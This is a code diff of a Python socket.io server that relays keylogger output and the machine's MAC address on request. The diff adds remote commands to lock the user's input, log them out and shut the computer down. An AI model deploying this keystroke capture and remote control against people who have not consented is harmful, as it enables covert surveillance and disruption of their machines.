@@ -1,6 +1,8 @@
 import socketio
 from getmac import get_mac_address 
 from keylogger import KeyLogger
+from disable_input import lock_input, unlock_input
+from shutdown_logout import *
 import eventlet
 import threading
 
@@ -11,10 +13,8 @@ def create_socket_server():
     return sio, app
 
 class SocketServer:
-    def __init__(self, host, port):
+    def __init__(self):
         self.sio, self.app = create_socket_server()
-        self.host = host
-        self.port = port
         self.keylogger = None
         self.lock = threading.Lock()
         self.init_event_handler()
@@ -25,6 +25,21 @@ class SocketServer:
         self.sio.on('request_mac', self.__request_mac_handler)
         self.sio.on('request_key', self.__request_key_handler)
         self.sio.on('stop_key', self.__stop_key_handler)
+        self.sio.on('logout', self.__logout_handler)
+        self.sio.on('shutdown', self.__shutdown_handler)
+        self.sio.on('control_input', self.__control_input_handler)
+        
+    def __control_input_handler(self, sid, data):
+        if data["is_lock"]:
+            lock_input()
+        else:
+            unlock_input()
+    
+    def __logout_handler(self, sid):
+        logout()
+    
+    def __shutdown_handler(self, sid):
+        shutdown()
         
     def __connect_handler(self, sid, environ):
         print("connect ", sid)
@@ -39,7 +54,6 @@ class SocketServer:
         self.sio.emit('return_key', self.keylogger.take_buff())
         
     def __stop_key_handler(self, sid):
-        print('stop')
         if self.keylogger:
             self.keylogger.stop()
             self.keylogger = None
@@ -47,10 +61,8 @@ class SocketServer:
     def __request_mac_handler(self, sid):
         self.sio.emit('return_mac', str(get_mac_address()))
     
-    def run_server(self):
-        eventlet.wsgi.server(eventlet.listen((self.host, self.port)), self.app)
+    def run_server(self, host = '127.0.0.1', port = 26100):
+        eventlet.wsgi.server(eventlet.listen((host, port)), self.app)
     
-HOST = '127.0.0.1'
-PORT = 26100
-server_socket = SocketServer(HOST, PORT)
+server_socket = SocketServer()
 server_socket.run_server()
